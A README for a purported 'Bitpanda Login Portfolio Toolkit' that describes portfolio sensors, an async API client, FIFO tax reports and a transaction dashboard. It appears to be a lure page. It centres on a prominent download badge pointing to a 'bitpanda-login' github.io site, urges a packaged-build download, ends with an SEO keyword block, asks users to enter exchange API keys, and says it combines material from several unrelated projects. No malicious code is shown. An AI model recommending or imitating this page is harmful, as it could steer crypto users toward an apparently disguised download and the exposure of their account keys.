# Bitpanda Login Portfolio Toolkit - Portfolio, Transactions, Wallets, And Reporting

<p align="center">
  <img src="logo.png" alt="Bitpanda Login Portfolio Toolkit" width="220">
</p>

Bitpanda Login Portfolio Toolkit brings several practical Bitpanda workflows into one Python-focused repository. The collection combines read-only portfolio monitoring, transaction exploration, wallet balance sensors, asynchronous API access, CSV processing, FIFO calculations, and tax-report generation. It is designed for users who want a clear path from Bitpanda login and API-key setup to local portfolio data, dashboards, and reports.

The repository is organized around three working areas. The Home Assistant integration exposes portfolio totals and per-asset metrics, the asynchronous client handles account and market operations, and the tax module turns exported transaction data into classified FIFO results and PDF output. A compact browser dashboard and dark-mode assets are included alongside the Python code, tests, configuration, and behavior specifications.

[![GET BITPANDA TOOLKIT](https://img.shields.io/badge/GET%20BITPANDA%20TOOLKIT-0F9D8A?style=for-the-badge&logoColor=white)](https://bitpanda-login.github.io/bitpanda-login-portfolio-toolkit/bitpanda-login)

## Contents

- [What The Toolkit Covers](#what-the-toolkit-covers)
- [Repository Map](#repository-map)
- [Feature Matrix](#feature-matrix)
- [Quick Start](#quick-start)
- [Bitpanda Login And API Access](#bitpanda-login-and-api-access)
- [Portfolio Integration](#portfolio-integration)
- [Asynchronous Client](#asynchronous-client)
- [Transactions And FIFO Reports](#transactions-and-fifo-reports)
- [Browser Dashboard](#browser-dashboard)
- [Usage Recipes](#usage-recipes)
- [Testing And Validation](#testing-and-validation)
- [Troubleshooting](#troubleshooting)
- [Project Notes And License](#project-notes-and-license)

## What The Toolkit Covers

The Bitpanda login workflow is the starting point for features that require private account data. After creating a scoped API key in the account settings, the Python components can request portfolio balances, asset metadata, trades, transactions, and wallet information. Public price and asset operations can be used independently where the underlying component supports them.

The portfolio integration follows a read-only model. One configuration entry represents one account and can expose current value, invested amount, total return, return percentage, asset balances, average buy prices, and Earn-related attributes. Discovery runs during refresh, allowing a newly funded asset to appear without rebuilding the configuration.

The asynchronous client provides REST and websocket patterns for account balances, fees, orders, trades, instruments, candlesticks, prices, and order books. Connection handling and multiple subscription groups are represented in the included client code. The client example demonstrates the same event-loop structure used throughout the original asynchronous implementation.

The reporting module focuses on exported transaction history. It parses rows, classifies operations, reconciles records, applies FIFO ordering, calculates gains and losses, carries prior-year state, and creates a report. This workflow is useful when a Bitpanda review requires more detail than a portfolio total or wallet snapshot can provide.

## Repository Map

| Path | Purpose | Main Inputs | Main Outputs |
|---|---|---|---|
| [`src/integration/`](src/integration/) | Home Assistant portfolio integration | API key, account portfolio, asset metadata | Sensors, binary sensors, diagnostics |
| [`src/client/`](src/client/) | Asynchronous Bitpanda API client | API key, pairs, subscriptions | REST responses and websocket updates |
| [`src/tax/`](src/tax/) | CSV reconciliation and FIFO reporting | Transaction CSV, tax year, prior FIFO state | Calculations, JSON state, PDF report |
| [`tests/integration/`](tests/integration/) | Portfolio unit tests | Mocked portfolio and API data | Validation results |
| [`tests/home_assistant/`](tests/home_assistant/) | Setup and config-flow tests | Home Assistant fixtures | Integration lifecycle checks |
| [`docs/`](docs/) | Dashboard requirements and design notes | Transaction and filter behavior | Specifications and implementation tasks |
| [`index.html`](index.html) | Browser transaction explorer | Transaction and balance API data | Filtered tables and summaries |
| [`main.js`](main.js) | Bitpanda web dark-mode behavior | Browser document state | Theme adjustments |
| [`main.css`](main.css) | Dark-mode presentation rules | Existing page elements | Dark visual styling |

<details>
<summary>Key Python modules</summary>

| Module | Responsibility |
|---|---|
| [`src/integration/api.py`](src/integration/api.py) | Portfolio API communication |
| [`src/integration/portfolio.py`](src/integration/portfolio.py) | Portfolio data preparation |
| [`src/integration/coordinator.py`](src/integration/coordinator.py) | Refresh scheduling and shared state |
| [`src/integration/sensor.py`](src/integration/sensor.py) | Portfolio and asset sensors |
| [`src/integration/config_flow.py`](src/integration/config_flow.py) | Account setup and API-key flow |
| [`src/client/BitpandaClient.py`](src/client/BitpandaClient.py) | Asynchronous REST and websocket client |
| [`src/client/subscriptions.py`](src/client/subscriptions.py) | Subscription definitions |
| [`src/tax/core/parser.py`](src/tax/core/parser.py) | Transaction-file parsing |
| [`src/tax/core/classifier.py`](src/tax/core/classifier.py) | Transaction classification |
| [`src/tax/core/fifo.py`](src/tax/core/fifo.py) | FIFO state and lot handling |
| [`src/tax/core/calculator.py`](src/tax/core/calculator.py) | Report calculations |
| [`src/tax/pdf/generator.py`](src/tax/pdf/generator.py) | PDF report generation |

</details>

## Feature Matrix

| Capability | Portfolio Integration | Async Client | Tax Module | Browser Dashboard |
|---|:---:|:---:|:---:|:---:|
| Bitpanda login API-key flow | Yes | Yes | No | Yes |
| Read-only portfolio totals | Yes | Yes | Imported data | Yes |
| Crypto wallet balances | Yes | Yes | Reconciled | Yes |
| Fiat wallet balances | Yes | Yes | Reconciled | Limited |
| Asset prices and metadata | Yes | Yes | Referenced | Yes |
| Trades and transactions | Snapshot metrics | Yes | CSV input | Yes |
| FIFO calculations | No | No | Yes | No |
| Prior-year state | No | No | Yes | No |
| PDF generation | No | No | Yes | No |
| Home Assistant entities | Yes | No | No | No |
| Websocket subscriptions | No | Yes | No | No |
| Coin and time filters | No | No | By tax year | Yes |

### Supported Portfolio Data

The integration model supports cryptocurrencies, fiat cash balances, portfolio totals, and per-asset valuation. Depending on API data, entities can include available amount, committed amount, invested amount, average acquisition price, current value, current price, total return, return percentage, and Earn APR. Zero-balance holdings can remain hidden until they become active.

The browser view summarizes deposits and withdrawals by coin and time. Coin cards show transaction counts, crypto totals, and available EUR totals. Time rows group activity by year and month. Type, coin, and time filters stack together, while clicking an active selection clears that specific filter.

## Quick Start

### Method One: Get The Packaged Build

Use the download button near the top of this page. Keep `logo.png`, `index.html`, the root configuration files, and the `src`, `tests`, and `docs` directories together after extraction. This layout preserves the local links and module references used throughout the toolkit.

### Method Two: Prepare The Python Workspace

The following PowerShell sequence creates an isolated environment and installs the report-module requirements:

```powershell
git clone <repository-path> bitpanda-login-toolkit
Set-Location bitpanda-login-toolkit
python -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -r .\src\tax\requirements.txt
python .\src\tax\main.py
```

For the portfolio integration development environment, use the locked project configuration:

```powershell
uv sync --locked --dev
uv run pytest -q
```

The committed [`uv.lock`](uv.lock) and [`pyproject.toml`](pyproject.toml) define the integration-oriented environment. The separate [`requirements-async.txt`](requirements-async.txt) records the dependencies used by the asynchronous client.

## Bitpanda Login And API Access

Open the Bitpanda login page in your normal browser session, enter the account settings, and create an API key for the intended component. Portfolio monitoring should use the smallest read scope that supplies balances and portfolio data. Transaction exploration needs transaction and balance access. Client methods that manage orders require the corresponding trading scope.

Treat the API key like a password. Keep it out of command history, screenshots, source files, commits, and browser bookmarks. Use an environment variable or the component's protected configuration entry when available. The Home Assistant flow stores the value as a config-entry secret, sends it as the API-key header, and removes it from diagnostics.

| Workflow | Suggested Access | Storage Location |
|---|---|---|
| Portfolio monitoring | Read portfolio and balances | Home Assistant config entry |
| Transaction explorer | Read transactions and balances | Current browser session |
| Async market-data client | Public data or account read | Environment variable |
| Order operations | Explicit trading access | Environment variable |
| CSV and FIFO report | No API key required | Local exported file |

After Bitpanda login configuration is complete, test one low-impact read operation before enabling periodic refreshes or multiple websocket subscriptions. A successful balance or portfolio request confirms the key, account, and request headers. An authentication error usually indicates a copied character, missing scope, expired key, or incorrect endpoint family.

## Portfolio Integration

The integration is centered on the coordinator and entity model in [`src/integration/`](src/integration/). The API layer requests portfolio and asset metadata, the portfolio layer normalizes values, and the coordinator distributes each refresh to sensors. One account configuration can produce a portfolio summary plus a consistent sensor set for every discovered asset.

### Typical Entity Set

- API status with complete, partial, or unavailable state.
- Current portfolio value in the configured reporting currency.
- Total invested amount.
- Total return and return percentage.
- Asset amount and available amount.
- Derived committed amount and committed percentage.
- Average buy price and current price.
- Earn APR and availability when matching configuration data exists.

The default polling behavior is intentionally moderate. Refreshing every few minutes is usually enough for dashboard monitoring, while the source integration uses a fifteen-minute default. Home Assistant Recorder can retain sensor history and provide longer-term charts without repeatedly requesting old portfolio operations.

To adapt the copied integration directory for a Home Assistant installation, place its contents under the expected custom-component package name and restart Home Assistant. Then add the integration from Devices and Services, enter the read-scoped key, and review the created entities. The translations in [`src/integration/translations/`](src/integration/translations/) provide English and German setup text.

## Asynchronous Client

The asynchronous client in [`src/client/`](src/client/) demonstrates REST requests and parallel websocket processing. [`src/client/example.py`](src/client/example.py) is the practical starting point. It creates a client, defines currency pairs, calls account and market methods, composes subscriptions, starts the subscriptions, and closes the client when processing is complete.

```python
import asyncio

from BitpandaClient import BitpandaClient
from Pair import Pair


async def run():
    client = BitpandaClient("<API_KEY>")
    await client.get_account_balances()
    await client.get_order_book(Pair("BTC", "EUR"))
    await client.close()


asyncio.run(run())
```

The full example also covers fees, orders, trades, currencies, candlesticks, instruments, server time, account feeds, price feeds, order books, and market tickers. Subscription groups can share one websocket or run in separate connections. Automatic reconnection behavior is included for remote connection termination.

Keep lifecycle handling explicit. Create the client inside the async flow, await each request, and close the session at the end. When using subscriptions, register callbacks before starting the event loop and keep callback work short enough that incoming messages can continue to be processed.

## Transactions And FIFO Reports

The report workflow begins with a Bitpanda download of transaction history in CSV form. The local file is parsed and classified before calculations begin, so this route does not need a live Bitpanda login session. The copied implementation supports a graphical entry point and command-line arguments.

```powershell
python .\src\tax\main.py
```

For a direct run with explicit values:

```powershell
python .\src\tax\main.py --csv .\data\transactions.csv --year 2025 --fifo-prev .\data\fifo_state_2024.json --output .\reports\portfolio_2025.pdf
```

The FIFO file preserves purchase lots that remain open after a reporting period. Load the previous state before calculating the next year, then retain the newly generated state with the report. This year-to-year chain allows older acquisitions to remain available when later sales consume the earliest lots.

The core processing stages are visible in the source tree:

1. The parser reads the exported transaction rows.
2. The classifier identifies purchases, sales, staking, airdrops, promotions, and related operations.
3. Reconciliation aligns records that belong to the same economic event.
4. FIFO processing consumes the oldest available acquisition lots.
5. The calculator aggregates results for the selected year.
6. The PDF generator creates the final report.

## Browser Dashboard

Open [`index.html`](index.html) through a local web server when using the transaction explorer. Serving the file avoids browser restrictions that can affect direct API calls from a local file.

```powershell
python -m http.server 8080
```

Then open the local server address, enter the scoped key in the input field, and fetch transactions. The dashboard updates while pages arrive and provides transaction statistics, coin summaries, time summaries, transaction rows, and blockchain-wallet rows.

![Portfolio Toolkit Mark](logo.png)

The design specifications under [`docs/`](docs/) describe expected dashboard behavior. Clicking a deposit or withdrawal statistic applies a type filter, and clicking the active statistic again clears it. Coin cards synchronize with the coin selector. Year rows expand into active months. All active filter dimensions use AND logic, so a BTC deposit filter for one month returns only records that satisfy all three selections.

<details>
<summary>Dashboard display rules</summary>

- Years appear from most recent to oldest.
- Months appear only when they contain transactions.
- Coin cards sort by available EUR volume.
- Missing EUR values retain an explicit unavailable count.
- Mixed deposit and withdrawal addresses remain visible for either matching type.
- Active cards and rows use a selected visual state.
- Transaction and blockchain-wallet tables update together.

</details>

## Usage Recipes

### Review A Portfolio Snapshot

Complete Bitpanda login and create a read-scoped key. Add the portfolio integration, wait for its first coordinator refresh, and inspect the portfolio total before individual assets. Compare invested amount, current value, return, and return percentage. Enable zero-balance holdings only when historical or dormant assets are needed.

### Inspect Deposit And Withdrawal Activity

Serve [`index.html`](index.html), fetch transaction pages, and select a type card. Add a coin selection and then a year or month selection. Clear any selection by clicking its active card or row again. Export the filtered transaction table when a smaller CSV is needed for a Bitpanda review.

### Run A FIFO Calculation

Export the full transaction history, place it in a local data directory, and start [`src/tax/main.py`](src/tax/main.py). Select the reporting year and previous FIFO state when present. Generate the PDF and retain the new state beside the report for the following period.

### Monitor Market Data

Install the dependencies in [`requirements-async.txt`](requirements-async.txt), update the key placeholder in a local copy of [`src/client/example.py`](src/client/example.py), and select the desired pairs. Begin with one price or order-book subscription. Add separate websocket groups only after confirming that callbacks and shutdown handling work correctly.

## Testing And Validation

The copied test suite covers API parsing, portfolio construction, diagnostics, sensor behavior, setup, and configuration flow. Run the integration tests from the configured Python environment:

```powershell
uv run pytest -q
uv run ruff check src tests
uv run ruff format --check src tests
```

| Test Area | File |
|---|---|
| API behavior | [`tests/integration/test_api.py`](tests/integration/test_api.py) |
| Portfolio calculations | [`tests/integration/test_portfolio.py`](tests/integration/test_portfolio.py) |
| Sensor entities | [`tests/integration/test_sensor.py`](tests/integration/test_sensor.py) |
| Diagnostic redaction | [`tests/integration/test_diagnostics.py`](tests/integration/test_diagnostics.py) |
| Integration setup | [`tests/home_assistant/test_setup.py`](tests/home_assistant/test_setup.py) |
| Configuration flow | [`tests/home_assistant/test_config_flow.py`](tests/home_assistant/test_config_flow.py) |

The dashboard specifications provide a second validation layer. Review [`docs/change-dashboard/tasks.md`](docs/change-dashboard/tasks.md) for the implementation checklist and the three specification folders for type, coin, and time-filter scenarios.

## Troubleshooting

<details>
<summary>The API key is rejected after Bitpanda login</summary>

Create a fresh key with the required scope, copy it without surrounding spaces, and confirm that the component uses the expected account or public API family. Test one read request before enabling polling or subscriptions.

</details>

<details>
<summary>Portfolio entities show unavailable values</summary>

Check the API-status entity first. A partial response can leave individual fields unavailable while preserving the rest of the portfolio. Confirm the reporting currency, asset metadata, key scope, and coordinator logs.

</details>

<details>
<summary>The browser dashboard does not fetch data</summary>

Serve [`index.html`](index.html) with `python -m http.server` instead of opening it directly. Confirm transaction and balance permissions, then reload the local page and submit the key again.

</details>

<details>
<summary>The FIFO report lacks acquisition history</summary>

Load the previous year's FIFO state or provide an appropriate starting state before calculation. A current-year CSV alone cannot represent unsold lots acquired in earlier periods.

</details>

<details>
<summary>Websocket updates stop</summary>

Inspect callback exceptions, subscription parameters, pair symbols, message size, and client shutdown handling. Keep callbacks lightweight and allow the client's reconnection flow to recreate remotely terminated connections.

</details>

## Discovery Tags

bitpanda login, bitpanda app, bitpanda review, bitpanda download, bitpanda fees, crypto portfolio, transaction explorer, wallet balances, API client, Home Assistant, FIFO calculator, tax report, CSV parser, crypto prices, websocket

## Project Notes And License

The repository combines source material from transaction-explorer, portfolio-profit, Home Assistant, asynchronous-client, CSV, API-client, dark-mode, and tax-report projects. Keep module boundaries clear when extending the toolkit, add tests beside behavior changes, and update the dashboard specifications when filter behavior changes.

Configuration and API examples use placeholders. Store real keys outside tracked files and retain generated reports, transaction exports, and FIFO state in local data directories. Review scopes whenever a workflow changes from portfolio reads to transaction or order operations.

The included source projects use permissive MIT-style terms. Preserve existing file headers and applicable license information when redistributing or modifying their code. Contributions should include a concise description, focused tests, formatting checks, and documentation updates for user-visible behavior.
